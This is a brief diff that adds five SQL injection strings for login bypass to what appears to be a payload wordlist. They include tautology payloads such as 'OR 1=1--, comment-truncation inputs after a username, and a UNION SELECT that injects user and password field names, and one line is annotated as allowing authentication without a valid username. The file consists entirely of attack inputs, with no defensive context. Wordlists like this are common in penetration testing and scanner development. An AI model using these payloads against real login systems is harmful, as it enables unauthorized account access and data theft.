@@ -1,0 +1,5 @@
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
